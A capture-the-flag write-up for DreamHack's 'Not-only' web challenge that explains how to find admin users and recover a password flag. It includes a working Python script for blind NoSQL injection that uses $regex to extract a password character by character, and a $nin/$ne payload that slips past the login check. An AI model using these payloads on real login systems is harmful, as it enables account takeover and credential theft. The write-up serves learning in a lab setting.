# Not-only — DreamHack

> **Room / Challenge:** Not-only (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Not-only (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1619`
- **Level:** `2`
- **Date:** `21-11-2025`

---

## Goal

Find the correct user and brute-force the password to get the flag.

## My Solution

Based on the description:

```
Find a user with admin rights! The user's password is a flag. The password format is a string containing numbers, uppercase and lowercase letters, and special characters. { }

How many admin users are there?

The flag format is DH{}
```

We have some details. We have to:

- Find a user with admin rights.
- Brute-force the password which is the flag, with the content containing numbers, uppercase and lowercase letters, spacial characters.

`db.sql`:

```sql
use main;
db.user.insert({"uid": "guest", "upw": "guest", "admin": 0});
db.user.insert({"uid": "hack", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "apple", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "melon", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "testuser", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "admin", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "aaaa", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "cream", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "berry", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "ice", "upw": "**sample**", "admin": 0});
db.user.insert({"uid": "panda", "upw": "**sample**", "admin": 0});
db.user.find();
```

Initially, I thought that the `admin` UID will have admin rights, so I will brute-force this account password with Blind NoSQL Injection:

```python
import requests
import string

target_url = 'http://host8.dreamhack.games:18694/login'

charset = "{}" + string.ascii_uppercase + string.ascii_lowercase + string.digits
current_flag = "e1b67f0e6"

for i in range(50):
    found = False
    for char in charset:
        payload = {
            "uid": 'admin',
            "upw": {
                "$regex": "^" + current_flag + char
            }
        }
        print(f'Tried {current_flag}{char}')

        response = requests.post(target_url, json=payload)

        if "Welcome," in response.text:
            found = True
            current_flag += char
            print(f'Found ${current_flag}')
            print()
            break

    if (found == False):
        print('Cannot found the correct char')
        break

```

The result I got `DH{fake}` doesn't seem like a real flag. Try logged in with that credentials:
![Guide image](./screenshots/1.png)

The `admin` UID doesn't have admin rights, I know that's why. We have to find the user with admin rights is 1 using this payload:

```python
found_users = []

# Found users that not in found_users
payload = {
    "uid": { "$nin": found_users },
    "upw": { "$ne": None }
}
```

Step-by-step check every accounts to see what user has admin rights, we will found `testuser` has admin rights to 1 and I just found first part of the flag by brute-forcing it. After some time testing, I found out that `cream` user also has admin right to 1. So also brute-force the password of `cream` to get the second part of the flag.
